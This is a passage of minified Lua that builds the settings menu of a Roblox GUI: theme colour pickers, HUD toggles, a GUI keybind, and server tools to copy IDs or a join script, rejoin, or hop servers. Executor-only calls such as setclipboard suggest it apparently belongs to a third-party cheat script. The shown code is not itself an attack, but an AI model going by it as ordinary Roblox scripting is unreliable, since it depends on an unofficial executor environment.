            Default = z(19, 19, 19),
            Alpha = 1,
            Flag = "ThemeSectionBackground",
            Callback = function(ad, ae)
                K:ChangeTheme("Section Background", ad)
            end
        }
    )
    local al = aa:Label("Element Color", "Left")
    local am =
        al:Colorpicker(
        {
            Name = "Element Color",
            Default = z(63, 63, 63),
            Alpha = 1,
            Flag = "ThemeElementColor",
            Callback = function(ad, ae)
                K:ChangeTheme("Element", ad)
            end
        }
    )
    local an = aa:Label("Border Color", "Left")
    local ao =
        an:Colorpicker(
        {
            Name = "Border Color",
            Default = z(68, 68, 68),
            Alpha = 1,
            Flag = "ThemeBorderColor",
            Callback = function(ad, ae)
                K:ChangeTheme("Border", ad)
            end
        }
    )
    local ap = aa:Label("Outline Color", "Left")
    local aq =
        ap:Colorpicker(
        {
            Name = "Outline Color",
            Default = z(0, 0, 0),
            Alpha = 1,
            Flag = "ThemeOutlineColor",
            Callback = function(ad, ae)
                K:ChangeTheme("Outline", ad)
            end
        }
    )
    local ar = aa:Label("Dark Liner", "Left")
    local as =
        ar:Colorpicker(
        {Name = "Dark Liner", Default = z(56, 56, 56), Alpha = 1, Flag = "ThemeDarkLiner", Callback = function(ad, ae)
                K:ChangeTheme("Dark Liner", ad)
            end}
    )
    local at = aa:Label("Risky Color", "Left")
    local au =
        at:Colorpicker(
        {
            Name = "Risky Color",
            Default = z(255, 50, 50),
            Alpha = 1,
            Flag = "ThemeRiskyColor",
            Callback = function(ad, ae)
                K:ChangeTheme("Risky", ad)
            end
        }
    )
    local av = aa:Label("Inline Color", "Left")
    local aw =
        av:Colorpicker(
        {
            Name = "Inline Color",
            Default = z(12, 12, 12),
            Alpha = 1,
            Flag = "ThemeInlineColor",
            Callback = function(ad, ae)
                K:ChangeTheme("Inline", ad)
            end
        }
    )
    local ax = S:Section({Name = "HUD", Side = 2})
    local ay =
        ax:Toggle(
        {Name = "Keybinds", Default = false, Flag = "HUDKeybinds", Callback = function(a0)
                if _G.KeybindList then
                    _G.KeybindList:SetVisibility(a0)
                end
            end}
    )
    local az =
        ax:Toggle(
        {Name = "Watermark", Default = false, Flag = "HUDWatermark", Callback = function(a0)
                if _G.Watermark then
                    _G.Watermark:SetVisibility(a0)
                end
            end}
    )
    local aA = ax:Label("GUI", "Left")
    local aB =
        aA:Keybind(
        {
            Name = "Toggle GUI",
            Mode = "Toggle",
            Default = Enum.KeyCode.Insert,
            Flag = "GUIToggleKey",
            Callback = function(aC)
                if L and L.SetOpen then
                    L:SetOpen(not L.IsOpen)
                end
            end
        }
    )
    do
        local aD = L.SetOpen
        L.SetOpen = function(self, aE)
            aD(self, aE)
            if aB and aB.Toggled ~= self.IsOpen then
                aB.Toggled = self.IsOpen
                if aB.KeybindListItem then
                    aB.KeybindListItem:SetStatus(self.IsOpen)
                end
            end
        end
    end
    do
        local aF = S:Section({Name = "Server", Side = 2})
        local aG =
            aF:Button(
            {Name = "Copy GameID", Callback = function()
                    setclipboard(tostring(game.GameId))
                    K:Notification("GameID copied to clipboard", 2, z(0, 255, 0))
                end}
        )
        local aH =
            aF:Button(
            {Name = "Copy JobID", Callback = function()
                    setclipboard(game.JobId)
                    K:Notification("JobID copied to clipboard", 2, z(0, 255, 0))
                end}
        )
        local aI =
            aF:Button(
            {
                Name = "Copy Join Script",
                Callback = function()
                    local aJ =
                        'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
                        game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)'
                    setclipboard(aJ)
                    K:Notification("Join script copied to clipboard", 2, z(0, 255, 0))
                end
            }
        )
        local aK =
            aF:Button(
            {Name = "Rejoin Game", Callback = function()
                    D:TeleportToPlaceInstance(game.PlaceId, game.JobId, g)
                end}
        )
        local aL =
            aF:Button(
            {
                Name = "Join New Server",
                Callback = function()
                    local aM, aN =
                        pcall(
                        function()
                            return e:JSONDecode(
                                game:HttpGetAsync(
                                    "https://games.roblox.com/v1/games/" ..
                                        game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
                                )
                            )
                        end
                    )
                    if aM and aN and aN.data and #aN.data > 0 then
                        local aO = aN.data[h(1, #aN.data)]
                        D:TeleportToPlaceInstance(game.PlaceId, aO.id)
                    else
                        K:Notification("Failed to get server list", 3, z(255, 0, 0))
                    end
                end
            }
        )
    end
end
K:Notification("Script loaded, press Insert to toggle GUI", 4, z(0, 255, 0))
